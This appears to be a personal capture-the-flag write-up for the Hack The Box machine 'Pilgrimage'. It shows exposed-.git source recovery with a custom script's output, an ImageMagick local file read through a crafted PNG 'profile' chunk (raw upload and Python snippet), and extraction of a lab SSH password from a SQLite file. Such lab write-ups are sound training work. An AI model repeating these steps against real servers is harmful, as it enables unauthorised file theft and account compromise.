# HTB - Pilgrimage
# IP: 10.10.11.219
# Methodology
Investigate > Research > Assess > Exploit > Review

# Investigate
## NMAP
```bash
nmap -sV -sC pilgrimage.htb
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web content

"SAVE SPACE AND SHRINK IT!
A free online image shrinker. Create an account to save your images!" - Website

A site is hosted which allowes simple user registration and the ability to upload and "shrink" image files. Like the nmap scan tells i can access a .git folder beyond the web file path. 
Deploying sites by git is potentially something i could see a company doing if they didn't know better.

Although the directories aren't browseable, accessing files directly works fine. Therefore looking through a .git folder structure is probably good time spent rather than having a tool do it for me.

## Source code

Having rebuilt the source code i began looking at the most interesting part of the site, among the code there was also a `magick` binary, this may be imagemagick and so is another thing to look at as imagemagick had a pretty serious RCE vulnerability so if there's a way i can trigger that i may be able to gain an internal foothold.


## ImageMagick

Version 7.1.0-49

Directory traversal vulnerability (assessing)
# Research
## Web content
### .git Directory scraping
`GET /.git/COMMIT_EDITMSG`
```
Pilgrimage image shrinking service initial commit.
# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# Author:    emily <emily@pilgrimage.htb>
#
# On branch master
#
# Initial commit
#
# Changes to be committed:
#	new file:   assets/bulletproof.php
#	new file:   assets/css/animate.css
#	new file:   assets/css/custom.css
#	new file:   assets/css/flex-slider.css
#	new file:   assets/css/fontawesome.css
#	new file:   assets/css/owl.css
#	new file:   assets/css/templatemo-woox-travel.css
#	new file:   assets/images/banner-04.jpg
#	new file:   assets/images/cta-bg.jpg
#	new file:   assets/js/custom.js
#	new file:   assets/js/isotope.js
#	new file:   assets/js/isotope.min.js
#	new file:   assets/js/owl-carousel.js
#	new file:   assets/js/popup.js
#	new file:   assets/js/tabs.js
#	new file:   assets/webfonts/fa-brands-400.ttf
#	new file:   assets/webfonts/fa-brands-400.woff2
#	new file:   assets/webfonts/fa-regular-400.ttf
#	new file:   assets/webfonts/fa-regular-400.woff2
#	new file:   assets/webfonts/fa-solid-900.ttf
#	new file:   assets/webfonts/fa-solid-900.woff2
#	new file:   assets/webfonts/fa-v4compatibility.ttf
#	new file:   assets/webfonts/fa-v4compatibility.woff2
#	new file:   dashboard.php
#	new file:   index.php
#	new file:   login.php
#	new file:   logout.php
#	new file:   magick
#	new file:   register.php
#	new file:   vendor/bootstrap/css/bootstrap.min.css
#	new file:   vendor/bootstrap/js/bootstrap.min.js
#	new file:   vendor/jquery/jquery.js
#	new file:   vendor/jquery/jquery.min.js
#	new file:   vendor/jquery/jquery.min.map
#	new file:   vendor/jquery/jquery.slim.js
#	new file:   vendor/jquery/jquery.slim.min.js
#	new file:   vendor/jquery/jquery.slim.min.map
#
```

There are a few automated tools to rebuild .git repos from a public site, however a lot of them rely on the page having readable directories which when the site blocks these attempts fails so i think i'll attempt to create one from scratch which only uses static readable files which i assume it can access.

## Source code
The main code i took a look at was the index as this seemed to be the main use of the site (when a POST request was made). This research lead me to the following code which checks for the image sent to the server and which converts and shrinks it.

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
```
The main bit of code which interests me is `exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);` on review there is no way to exploit this directly, but as i said previously, imagemagick has some exploits already known. 

This is why i am choosing to return to the [Investigation](#investigate) section before completing this cycle as i believe it would be useful to investigate what potential vulnerabilities the collected version of magick has.

## ImageMagick Information Disclosure / Local File Read

Looking at the version of magick (another name for imagemagick) we can see a lot of results for this version with results hinting at a arbitrary file reads. Reviewing these results describes the vulnerability but does not give specifics, it's only by reviewing the PoC code that it becomes clear that the attack here includes attaching additional data to a png image.

PNG files are seperated into chunks which can hold data not specifically just image data, this could include the header, but can also hold many different types of information. The full list of these types of chunk can be seen here https://www.w3.org/TR/2003/REC-PNG-20031110/#11Chunks. 

The chunk which is used in these PoC seems to be the `tEXt` chunk which 'contains a keyword and a text string, in the format:'

- Keyword 	1-79 bytes (character string)
- Null separator 	1 byte (null character)
- Text string 	0 or more bytes (character string)

When reviewing the PoC code what actually happens is a `tEXt` chunk is addded with the keyword as `profile` and the text string as the desired file. 

# Assess

## Automated .git directory rebuilding 
As previously mentioned there are a few tools which can help rebuild a .git repo from scratch but i'm trying to test myself so i ended up writing my own at about 80 lines. 

It's a pretty simple challenge which you from a few static files use gits own utility to generate the hashes of missing files, which gives a path to the remote repo to download. Finally using git ls-files and git checkout `filename` is enough to recreate the source from scratch.

## ImageMagick Local file read


I took ages doing this and it's only due to the fact i was having a hard time uploading the edited image through python, the page itself obviously doesn't give much indication when it actually fails which it does often if the format of the webkitform isn't exactly formatted the way that the system wants it...

The way the form needs to be uploaded can be seen by intercepting the upload POST request via burp:

```

------WebKitFormBoundaryrcZ9A9IDGz7zS7w4
Content-Disposition: form-data; name="toConvert"; filename="enc.png"
Content-Type: image/png

PNG


IHDR¿6ÌtEXtprofile/etc/passwdF×XIDATxìýi$irß	þô¹ÌÌ="²UînfÏ¹/TÍ"³+²+2äÝA£®Èws³GUÿÊcl?¯1'Þ¹d¶²³LÎ9î£Ã àãÌç_W¾¾m,üá÷¯<+ËrÅùHHË5à\¤U!oV+o¿~áþö%%ZÞ;Û¶1PÑÑZ¥J­ã½×ïÛ3µUÞßß¸?îýþ ÷NïR

```

I've cut this for brevity but the main issue was the "name" portion needed to be different than the "filename" portion, eventually i saw that this could be done by the following python:


```python
files = {'toConvert': ('enc.png',open('./enc.png','rb'))}
r = requests.post(url,files=files)
print(r.url)

> http://pilgrimage.htb/?message=http://pilgrimage.htb/shrunk/64ecb8b6e848b.png&status=success
```

After reading the file, the retrieved file if avaliable is stored as the "Raw profile type" info section on the file as a hex string.

I created my own PoC for this site stored in this same folder and i used this to explore the local file system.

# Exploit
## Automated .git scraping
```
python3 ./git-rebuild.py http://pilgrimage.htb/.git/
Initializing folder...
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /home/elliot/Development/Security/PY/git-rebuilder/pilgrimage.htb/.git/
Collecting static files from remote .git repo...
getting... http://pilgrimage.htb/.git/HEAD
getting... http://pilgrimage.htb/.git/config
getting... http://pilgrimage.htb/.git/index
getting... http://pilgrimage.htb/.git/.gitignore
HTTP Error 404: Not Found
Reading refs location...
refs/heads/master

http://pilgrimage.htb/.git/refs/heads/master

getting... http://pilgrimage.htb/.git/refs/heads/master

Reading initial hash...
e1a40beebc7035212efdcb15476f9c994e3634a7
Getting hash file...
getting... http://pilgrimage.htb/.git/objects/e1/a40beebc7035212efdcb15476f9c994e3634a7
using git to find missing hashes...
File List:

['assets/bulletproof.php', 'assets/css/animate.css', 'assets/css/custom.css', 'assets/css/flex-slider.css', 'assets/css/fontawesome.css', 'assets/css/owl.css', 'assets/css/templatemo-woox-travel.css', 'assets/images/banner-04.jpg', 'assets/images/cta-bg.jpg', 'assets/js/custom.js', 'assets/js/isotope.js', 'assets/js/isotope.min.js', 'assets/js/owl-carousel.js', 'assets/js/popup.js', 'assets/js/tabs.js', 'assets/webfonts/fa-brands-400.ttf', 'assets/webfonts/fa-brands-400.woff2', 'assets/webfonts/fa-regular-400.ttf', 'assets/webfonts/fa-regular-400.woff2', 'assets/webfonts/fa-solid-900.ttf', 'assets/webfonts/fa-solid-900.woff2', 'assets/webfonts/fa-v4compatibility.ttf', 'assets/webfonts/fa-v4compatibility.woff2', 'dashboard.php', 'index.php', 'login.php', 'logout.php', 'magick', 'register.php', 'vendor/bootstrap/css/bootstrap.min.css', 'vendor/bootstrap/js/bootstrap.min.js', 'vendor/jquery/jquery.js', 'vendor/jquery/jquery.min.js', 'vendor/jquery/jquery.min.map', 'vendor/jquery/jquery.slim.js', 'vendor/jquery/jquery.slim.min.js', 'vendor/jquery/jquery.slim.min.map', '']
Getting Listed files... (This is the loud part so i'll let you stop here if you want..)

...

assets/js/custom.js
assets/js/isotope.js
assets/js/isotope.min.js
assets/js/owl-carousel.js
assets/js/popup.js
assets/js/tabs.js
assets/webfonts/fa-brands-400.ttf
assets/webfonts/fa-brands-400.woff2
assets/webfonts/fa-regular-400.ttf
assets/webfonts/fa-regular-400.woff2
assets/webfonts/fa-solid-900.ttf
assets/webfonts/fa-solid-900.woff2
assets/webfonts/fa-v4compatibility.ttf
assets/webfonts/fa-v4compatibility.woff2
dashboard.php
index.php
login.php
logout.php
magick
register.php
vendor/bootstrap/css/bootstrap.min.css
vendor/bootstrap/js/bootstrap.min.js
vendor/jquery/jquery.js
vendor/jquery/jquery.min.js
vendor/jquery/jquery.min.map
vendor/jquery/jquery.slim.js
vendor/jquery/jquery.slim.min.js
vendor/jquery/jquery.slim.min.map

Rebuild finished. Please check folder now.
```
Completed source code retrieval.

## ImageMagick Local file read

Having a Local file read is good but only if we know about a specific file which is useful to us, i tried the typical list including:
- /etc/passwd
- nginx files

I had to review the source code of the site to remember that the php actually makes a call to a sqlite database.

```php
function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
```
Well that seems as good a target.
Although my script doesn't handle this file as well as i'd like, the hex returned was entered into cyberchef, i knew this was the sql file as the header is in the format i expect.

```
 HSQLite format 
...
StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1images+tableusersusersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL)ndexsqlite_autoindex_users_1users-emilyabigchonkyboi123
```
I've stripped a lot out here, but the main thing is that within this file exists a username and password it seems. `emily : abigchonkyboi123` (and yes these work in SSH), time for a quick review before moving on.


# Review
## .git rebuilding
It was a pretty simple challenge to rebuild the git repo even though directory viewing was turned off. It'll also made me think twice about simply leaving source material hanging around on production environments..

Now i have source code i will need to [investigate](#investigate) to see if there are any vulnerabilities.